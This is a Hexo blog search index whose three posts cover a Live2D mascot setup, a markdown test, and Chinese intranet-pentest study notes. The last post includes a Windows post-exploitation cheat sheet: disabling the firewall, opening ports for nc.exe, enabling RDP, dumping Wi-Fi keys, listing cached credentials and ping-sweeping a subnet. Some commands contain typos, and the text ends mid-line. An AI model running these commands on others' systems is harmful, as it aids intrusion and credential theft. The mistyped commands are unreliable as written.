<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hexo+buuterfly+Cubism5.0自定义看板娘搭建</title>
      <link href="/posts/f407262d9961/"/>
      <url>/posts/f407262d9961/</url>
      
        <content type="html"><![CDATA[<p>由于我的模型是新模型(SDK5.0&#x2F;Cubism5.0的版本)，文件格式为moc3，github上helper-llive2d是不支持这个内核版本，并且live2d-moc3，所以导致现在网上的一些教程是不匹配的，不能实现这个版本看板娘的搭建</p><p>链接如下：</p><p><a href="https://blog.csdn.net/weixin_44517301/article/details/106348887?ops_request_misc=%7B%22request_id%22:%22172065980216800178579183%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=172065980216800178579183&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-106348887-null-null.142%5Ev100%5Epc_search_result_base3&utm_term=%E4%BD%BF%E7%94%A8hexo%E7%9A%84helper-live2d&spm=1018.2226.3001.4187">Hexo添加Live2D看板娘最新教程_hexo live2d 教程-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_43868299/article/details/108949274?ops_request_misc=%7B%22request_id%22:%22172059240916800188571546%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=172059240916800188571546&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-108949274-null-null.142%5Ev100%5Epc_search_result_base3&utm_term=%E4%BD%BF%E7%94%A8hexo%E7%9A%84helper-live2d&spm=1018.2226.3001.4187">使用Hexo的helper-live2d插件自定义博客看板娘_hexo-helper-live2d-CSDN博客</a></p><p><a href="https://github.com/LitStronger/live2d-moc3">LitStronger&#x2F;live2d-moc3: live2d, 适用于加载新版moc3游戏角色模型(碧蓝航线)。附带使用例子 (github.com)</a></p><p><a href="https://blog.csdn.net/weixin_43641850/article/details/108154098">网页&#x2F;博客Hexo添加live2d游戏角色看板娘,简易添加，碧蓝航线等live2d新型游戏角色模型（moc3）_moc3放网页上-CSDN博客</a></p><p>都不太能符合这个模型，会出现类似于现在的内核版本过低导致模型无法加载的问题</p><p>这个问题是通过解决修改内核解决的</p><p>例如这个大佬的</p><p><a href="https://www.cnblogs.com/Arisf/p/14347362.html">在博客园主页添加一个Live2D moc3 - Arisf - 博客园 (cnblogs.com)</a>，但他的也不能直接用，因为他把内核保存在本地版本没随官方更新，不是5.0的，我们只需要修改这一部分就行</p><p>不嫌弃的话，可以直接用我的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/xudamu/Doro@3/bundle.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//存在我项目里的启动器的js</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cubism.live2d.com/sdk-web/cubismcore/live2dcubismcore.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    //官方的最新内核</span><br></pre></td></tr></table></figure><p>添加在</p><p><img src="https://i.postimg.cc/66Pk2t8q/image.png" alt="img"></p><p>我这个是buuterfly主题，原理上你只需要保证其能插入到你的文档中就行(头部加载)，就是个启动器和内核的js</p><p>然后再文本中插入你的canvas</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;canvas id=&quot;live2d&quot; width=&quot;400&quot; height=&quot;400&quot; class=&quot;live2d&quot; style=&quot;position: fixed; opacity: 1; left: -110px; bottom: -135px; z-index: 99999; pointer-events: none;&quot;&gt;&lt;/canvas&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;  </span><br><span class="line">var resourcesPath = &#x27;https://cdn.jsdelivr.net/gh/Arisf0617/ATRI@v1.0/&#x27;; // 指定资源文件（模型）保存的路径，使用github的release版本，路径如下https://cdn.jsdelivr.net/gh/用户/库@版本号/资源路径</span><br><span class="line">var backImageName = &#x27;&#x27;; // 指定背景图片 ,默认为空</span><br><span class="line">var modelDir = [&#x27;ATRI&#x27;]; // 指定需要加载的模型</span><br><span class="line">initDefine(resourcesPath, backImageName, modelDir); // 初始化模型&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>我这里是将resourcepath和modeldir改了，并作一行写入bottom就行</p><p>保存然后</p><p>hexo clean;hexo g;hexo s在本地看看效果，模型加载较慢是正常现象，得等会。如果有好的方法欢迎讨论，我也想知道，别逼我求你(✿◕‿◕✿)</p><p>我这里是将模型传到了github上创建了release，就能在<a href="https://cdn.jsdelivr.net/gh/%E7%94%A8%E6%88%B7/%E5%BA%93@%E7%89%88%E6%9C%AC%E5%8F%B7/%E8%B5%84%E6%BA%90%E8%B7%AF%E5%BE%84">https://cdn.jsdelivr.net/gh/用户/库@版本号/资源路径</a>    进行访问了，这里的版本号是你创建release时加的tag</p><p>快去试试吧！</p>]]></content>
      
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxx</title>
      <link href="/posts/c76cf8828a3b/"/>
      <url>/posts/c76cf8828a3b/</url>
      
        <content type="html"><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><p>代码测试：<br>`&#96;&#96;py<br>print(“Hello”)<br>`&#96;&#96;</p><p>注意：这里因为我放在md文件中的，所以加上了\，不解析&#96;&#96;&#96;，实际测试时请去掉\。</p><p>图片测试：</p><p><img src="http://mculover666.cn/blog/20191031/R4mWMXsrRKxu.png?imageslim"></p><p>引用测试：</p><blockquote><p>这是一条引用</p></blockquote><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><p>无序列表测试：</p><ul><li>哈哈</li><li>嘿嘿</li><li>吼吼</li></ul><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>测试博客</title>
      <link href="/posts/d557603f916a/"/>
      <url>/posts/d557603f916a/</url>
      
        <content type="html"><![CDATA[<h1 id="超算测试第一博客"><a href="#超算测试第一博客" class="headerlink" title="超算测试第一博客"></a>超算测试第一博客</h1><h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2><p>姓名：许</p><p>性别：男</p><p>喜好：无特别，但打游戏、小说、漫画、番剧轮流占用时间</p><p>特长：暂无</p><p>自我评价：还行，吼吼</p><p>github:<a href="http://www.github.com/xudamu">www.github.com/xudamu</a></p><h3 id="下面是截取的另外的笔记"><a href="#下面是截取的另外的笔记" class="headerlink" title="下面是截取的另外的笔记"></a>下面是截取的另外的笔记</h3><h1 id="内网介绍"><a href="#内网介绍" class="headerlink" title="内网介绍"></a>内网介绍</h1><p>内部局域网，可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮箱和传真通信服务等</p><p><img src="https://i.postimg.cc/TwJnHJDH/image.png" alt="img"></p><p>除了DMZ区一个web服务器或什么服务器上挖漏洞外，我们还可以，打印机、摄像头、路由器、智能电视？外来接入加入的路由器，通过流量劫持获取账号密码或者是强制分配IP都可以进入内网</p><p>钓鱼远控、提供路由器、攻击子公司、社工插U盘等都可以攻入内网</p><h2 id="工作组介绍"><a href="#工作组介绍" class="headerlink" title="工作组介绍"></a>工作组介绍</h2><p>按照不同职能对计算机进行分组</p><h4 id="加入工作组"><a href="#加入工作组" class="headerlink" title="加入工作组"></a>加入工作组</h4><p>计算机属性中找到工作组，添加即可</p><p><img src="https://i.postimg.cc/dt6wtk2P/image2.png" alt="img"></p><p><img src="https://i.postimg.cc/3w4TBtPY/image3.png" alt="img"></p><h4 id="创建工作组"><a href="#创建工作组" class="headerlink" title="创建工作组"></a>创建工作组</h4><h4 id="退出工作组"><a href="#退出工作组" class="headerlink" title="退出工作组"></a>退出工作组</h4><p><img src="https://i.postimg.cc/3w4TBtPY/image4.png" alt="img"></p><p>把下面改掉即可，改成想要的，点击确定就能创建</p><h4 id="访问工作组"><a href="#访问工作组" class="headerlink" title="访问工作组"></a>访问工作组</h4><p>点击即可</p><h4 id="工作组的优缺点"><a href="#工作组的优缺点" class="headerlink" title="工作组的优缺点"></a>工作组的优缺点</h4><p>优点：方便管理、资源分配灵活</p><p>缺点： 缺乏集中管理与控制的机制、没有集中的统一账户管理、只适合小规模用户使用</p><h2 id="域介绍"><a href="#域介绍" class="headerlink" title="域介绍"></a>域介绍</h2><p>解决上面工作组没有统一管理的缺陷，由域控制器管理域。连接域需要登录域的账号密码，而域的账号密码都在域控制器中</p><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>通常在地理位置固定的小公司中，一个域就能满足需求，但是在一个域汇内，一般有两台域控制器，一台作为DC、另一台作为备份DC(域控制器)</p><p>同时一般来说DC和DNS会是同一台服务器，这种情况会比较多</p><h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>第一个域就是父域，下面就是他的子域</p><h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>总个父域和子域就是域树</p><h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p>就是多个域树</p><h3 id="搭建域环境"><a href="#搭建域环境" class="headerlink" title="搭建域环境"></a>搭建域环境</h3><p>。。。</p><h3 id="活动目录介绍"><a href="#活动目录介绍" class="headerlink" title="活动目录介绍"></a>活动目录介绍</h3><p>活动目录(AC&#x2F;Active Directory AD)是指域环境中提供目录服务的组件</p><p>可以在user中添加想要的权限</p><p><img src="https://i.postimg.cc/Vv1Pzm5k/image5.png" alt="img"></p><h3 id="域内权限介绍"><a href="#域内权限介绍" class="headerlink" title="域内权限介绍"></a>域内权限介绍</h3><p>这里后面都有描述的，直接将用户添加到相应的位置就可以</p><p>在创建用户的时候可以设置相关用户参数</p><p>做</p><p>账号集中管理：所有账号均存储在服务器中，方便执行命令和重置密码</p><p>软件集中管理：统一推送软件、安装网络打印机等、利用软件发布策略分发软件、可以让用户自由选择需要的软件</p><p>环境集中管理：统一客户端、iE、TCPP协议等设置。增强安全性：统一部署蛇毒软件和病毒扫描任务、集中管理用户的计算机权限、统一制定用户密码策略等、可以监控网络，对资料进行统一管理</p><p>更可靠，更短的宕机时间：例如，利用活动目录控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设置。网络更可靠，宕机时间更短</p><p>活动目录是微软提供的统一管理基础平台，ISA、Exchange、SMS等都依赖这个平台</p><p>组里面还可以加组</p><p><img src="https://i.postimg.cc/yYtnRnXF/image6.png" alt="img"></p><p>创建组内的组来控制组内用户的管理权限</p><h4 id="域内权限详细"><a href="#域内权限详细" class="headerlink" title="域内权限详细"></a>域内权限详细</h4><h5 id="组"><a href="#组" class="headerlink" title="组"></a>组</h5><p>组是用户账号的集合、通过向组分配权限，就可以不必向每个用户分别分配权限，方便管理</p><h5 id="域本地"><a href="#域本地" class="headerlink" title="域本地"></a>域本地</h5><p>域本地成员来自林中任何域中的用户账号、全局组和通用组以及本域中的域本地组，在本域范围内可用，是权限的划分组</p><h5 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h5><p>成员来自同一域的用户账户和全局组，在林范围内可用。是用户的集合组</p><h5 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h5><p>来自于林中任意于中的用户账户、全局组和其他通用组，在全林范围内可用</p><p>DYJ为打印机</p><p><img src="https://i.postimg.cc/vZnht93C/image7.png" alt="img"></p><p><img src="https://i.postimg.cc/d1s9FfwK/image8.png" alt="img"></p><p>A-G-DL-P策略</p><p>指将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分派资源权限</p><p>A表示用户账号(Account)</p><p>G表示全局组</p><p>U表示通用组</p><p>DL表示域本地组</p><p>P表示资源权限</p><h3 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h3><p>目的是将一组安全等级相同的计算机划入同一网段。该网段的计算机拥有相同的网络边界、并在网络边界上部署防火墙来实现对其他安全域的网络访问控制策略，从而对允许哪些IP地址访问此域、允许此域访问哪些IP地址和网段进行设置。这些措施将网络风险最小化，当攻击发生时，可尽可能将威胁隔离，从而降低对域内计算机的影响。</p><p><img src="https://i.postimg.cc/mg3MrSdZ/image9.png" alt="img"></p><p>多层隔离</p><p>DMZ是放在公网上的，一般DMZ是不让访问内网的，防止DMZ的服务器被打崩当跳板跳入内网中</p><h3 id="域中计算机分类"><a href="#域中计算机分类" class="headerlink" title="域中计算机分类"></a>域中计算机分类</h3><h4 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h4><p>用于管理所有网络访问，有所有的共享目录和资源。域控制器中存储了域内所有的账户和策略信息，包括安全策略、用户身份验证信息和账户信息</p><p>有多台计算机可以被指定为域控制器，以分据用光的登录、访问等操作，多个域控制器可以一起工作，自动备份用户账户和活动目录数据。这样及时部分域控制器瘫痪，访问也不会受到影响</p><h4 id="成员服务器"><a href="#成员服务器" class="headerlink" title="成员服务器"></a>成员服务器</h4><p>成员服务器是指定安装了服务器操作系统并加入了域、但是没有安装活动目录的计算机，其主要任务是提供网络资源，成员服务器的类型通常由文件服务器、应用服务器、数据库服务器、web服务器、防火墙、远程访问服务器、打印服务器</p><h4 id="客户机"><a href="#客户机" class="headerlink" title="客户机"></a>客户机</h4><p>域中计算机可以是安装了其他操作系统的计算机，用户利用这些计算机和域中的账户可以登录域。这些计算机被称为域中的客户机。域用户账号通过域的安全验证后，即可访问域中的各种资源</p><h4 id="独立服务器"><a href="#独立服务器" class="headerlink" title="独立服务器"></a>独立服务器</h4><p>独立服务和域没有关系，如果服务器不加入域，也不安装活动目录，称为独立服务器。独立服务器可以创建工作组、与网络中其他计算机共享资源，但不用活动目录提供的任何服务</p><p>域控制器用于有放活动目录数据库，是域中必须要有的，而其他三种计算机则不要必须要有的，也就是说，最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。当然，域中各服务器的角色是可以改变的。例如，独立服务器既可以称为域控制器，也可以加入某个域成为成员服务器</p><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>内网信息、本机信息、内网IP、内网端口、域信息、域内用户</p><p>建立在创建了内网权限后。上线CS或msf后</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h4 id="手动收集内网信息"><a href="#手动收集内网信息" class="headerlink" title="手动收集内网信息"></a>手动收集内网信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">systeminfo | findstr /B /C:&quot;名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><p>查看系统体系结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><p>查看安装的软件以及版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br><span class="line">powershell &quot;Get-WmiObject -class win32_product | Select-Object name,version&quot;</span><br></pre></td></tr></table></figure><p>查看本机的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><p>进程信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><p>启动程序信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><p>计划任务信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schttasks /query /fo LIST /v</span><br><span class="line">如果上面的命令显示无法载入列资源，那么输入：chcp 437</span><br></pre></td></tr></table></figure><p>主机开机时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><p>查用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br><span class="line">wmic useraccount get name ,SID</span><br></pre></td></tr></table></figure><p>查会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><p>查端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p>查补丁</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe <span class="keyword">get</span> Caption,Description,HotFixID,Installedon</span><br></pre></td></tr></table></figure><p>查看共享列表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net share <span class="operator">/</span><span class="operator">/</span>横向移动？</span><br><span class="line">wmic share <span class="keyword">get</span> name, path,status</span><br></pre></td></tr></table></figure><p>查询路由信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure><p>查看防火墙是否开启</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall <span class="keyword">show</span> state <span class="operator">/</span><span class="operator">/</span>虽然说netsh firewall已经过时了，改成了netsh advfirewall firewall <span class="keyword">show</span> state无法执行</span><br></pre></td></tr></table></figure><p>关闭防火墙</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在windows2003前：netsh firewall <span class="keyword">set</span> opmode disable</span><br><span class="line">在windows2003之后：netsh firewall <span class="keyword">set</span> opmode disable 或者 netsh advfirewall <span class="keyword">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><p>查看防火墙配置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall <span class="keyword">show</span> config</span><br></pre></td></tr></table></figure><p>修改防火墙配置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windowserver2003之前：netsh firewall <span class="keyword">add</span> allowedprogram c:\nc.exe &quot;allownc&quot; enable <span class="operator">/</span><span class="operator">/</span>指定nc.exe能连接(出防火墙)</span><br><span class="line">windowserver2003之后：netsh advfirewall firewall <span class="keyword">add</span> rule name<span class="operator">=</span>&quot;pass nc&quot;dir<span class="operator">=</span><span class="keyword">in</span> action<span class="operator">=</span>allow program<span class="operator">=</span>&quot;c:/nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许端口放行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall <span class="keyword">add</span> rule name<span class="operator">=</span>&quot;RemoteDesktop&quot; protocol<span class="operator">=</span>TCP dir<span class="operator">=</span><span class="keyword">in</span> localport<span class="operator">=</span><span class="number">3389</span> action<span class="operator">=</span>allow</span><br></pre></td></tr></table></figure><p><img src="https://yxr37qkcj7k.feishu.cn/space/api/box/stream/download/asynccode/?code=NWE4NmY1NzE2OTYzNDhiMzUwODUyODViY2FmMWIzNjNfYndSQ3o1N0NWS3plN1lWNEtreVlNNTc5M1o5dUh4c09fVG9rZW46UmVXc2Joejc4b0NtOVp4eU9ZdWMwU1pBbjJmXzE3MjA1NjU2MzA6MTcyMDU2OTIzMF9WNA" alt="img"></p><p>允许端口进站</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall <span class="keyword">add</span> rule name<span class="operator">=</span>test dir<span class="operator">=</span><span class="keyword">in</span> action<span class="operator">=</span>allow protocol<span class="operator">=</span>tcp localport<span class="operator">=</span><span class="number">4444</span>#允许端口进站</span><br></pre></td></tr></table></figure><p>允许端口出站</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall <span class="keyword">add</span> rule name<span class="operator">=</span>test dir<span class="operator">=</span><span class="keyword">out</span> action<span class="operator">=</span>allow protocol<span class="operator">=</span>tcp localport<span class="operator">=</span><span class="number">4444</span>#允许端口进站</span><br></pre></td></tr></table></figure><p>允许程序入站</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall <span class="keyword">add</span> rule name<span class="operator">=</span>test dir<span class="operator">=</span><span class="keyword">in</span> action<span class="operator">=</span>allow program<span class="operator">=</span>c:<span class="operator">/</span><span class="operator">/</span>a.exe</span><br></pre></td></tr></table></figure><p>出站类似</p><p>开启远程服务</p><p>在2003机器上</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting <span class="keyword">where</span> (_CLASS <span class="operator">!=</span>&quot;&quot;) <span class="keyword">call</span> setallowtsconnections <span class="number">1</span></span><br></pre></td></tr></table></figure><p>在server2008和server 2021</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG <span class="keyword">ADD</span> HKLM\<span class="keyword">SYSTEM</span>\CurrentControlSet\Control\Terminal&quot; &quot;Server <span class="operator">/</span>v fDenyTSConnections <span class="operator">/</span>t TEG_DWORD <span class="operator">/</span>d <span class="number">00000000</span> <span class="operator">/</span>f</span><br><span class="line">REG <span class="keyword">ADD</span> HKLM\<span class="keyword">SYSTEM</span>\CurrentControlSet\Control\Terminal&quot; &quot;Server <span class="operator">/</span>v fDenyTSConnections <span class="operator">/</span>t TEG_DWORD <span class="operator">/</span>d <span class="number">11111111</span> <span class="operator">/</span>f</span><br></pre></td></tr></table></figure><p>查wifi密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="operator">/</span>f &quot;skip=9 tokens=1,2 delims=:&quot; <span class="operator">%</span>i <span class="keyword">in</span> (<span class="string">&#x27;netsh wlan show profiles&#x27;</span>) do <span class="variable">@echo</span> <span class="operator">%</span>j <span class="operator">|</span> findstr <span class="operator">-</span>i <span class="operator">-</span>v echo <span class="operator">|</span> netsh wlan <span class="keyword">show</span> profiles <span class="operator">%</span>j key<span class="operator">=</span>clear</span><br></pre></td></tr></table></figure><p>查看RDP(远程桌面协议)端口号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp&quot; <span class="operator">/</span>v PortNumber</span><br></pre></td></tr></table></figure><p>查代理信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Wicrosoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><p>查看登录凭证     &#x2F;&#x2F;可能有人将管理凭证缓存，然后这里就能看到</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey <span class="operator">/</span>list</span><br></pre></td></tr></table></figure><p>查看arp信息，查看地址存活</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp <span class="operator">-</span>a</span><br></pre></td></tr></table></figure><p>查看本机用户组</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup</span><br></pre></td></tr></table></figure><p>查看最近打开的文档</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir <span class="operator">%</span>APPDATA<span class="operator">%</span>\Microsoft\Windows\Recent</span><br></pre></td></tr></table></figure><p>查看本机用户组（windows11家庭版好像只能这么干）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup</span><br></pre></td></tr></table></figure><p>查看管理员组成员</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><h4 id="自动收集脚本"><a href="#自动收集脚本" class="headerlink" title="自动收集脚本"></a>自动收集脚本</h4><h3 id="bat脚本"><a href="#bat脚本" class="headerlink" title="bat脚本"></a>bat脚本</h3><p>查一些信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="operator">/</span>f &quot;delims=&quot; <span class="operator">%</span><span class="operator">%</span>A <span class="keyword">in</span> (<span class="string">&#x27;dir /s /b %WINDIR%\system32\*htable.xsl&#x27;</span>) do <span class="keyword">set</span> &quot;var=%%A&quot; </span><br><span class="line">wmic process <span class="keyword">get</span> CSName,Description,ExecutablePath,ProcessId <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic service <span class="keyword">get</span> Caption,Name,PathName,ServiceType,Started,StartMode,StartName <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic USERACCOUNT list <span class="keyword">full</span> <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic <span class="keyword">group</span> list <span class="keyword">full</span> <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic nicconfig <span class="keyword">where</span> IPEnabled<span class="operator">=</span><span class="string">&#x27;true&#x27;</span> <span class="keyword">get</span> Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic volume <span class="keyword">get</span> Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic netuse list <span class="keyword">full</span> <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic qfe <span class="keyword">get</span> Caption,Description,HotFixID,InstalledOn <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic startup <span class="keyword">get</span> Caption,Command,Location,<span class="keyword">User</span> <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic PRODUCT <span class="keyword">get</span> Description,InstallDate,InstallLocation,PackageCache,Vendor,Version <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic os <span class="keyword">get</span> name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic Timezone <span class="keyword">get</span> DaylightName,Description,StandardName <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html</span><br></pre></td></tr></table></figure><p>查本机IP范围内可连的IP</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="operator">/</span>L <span class="operator">%</span>I <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) DO <span class="variable">@ping</span> <span class="operator">-</span>w <span class="number">1</span> <span class="operator">-</span>n <span class="number">1</span> <span class="number">192.168</span><span class="number">.45</span>.<span class="operator">%</span>I <span class="operator">|</span> findstr &quot;TTL=&quot;   <span class="operator">/</span><span class="operator">/</span>中间的(<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>)，第一个是开头，<span class="number">254</span>是结尾。中间的<span 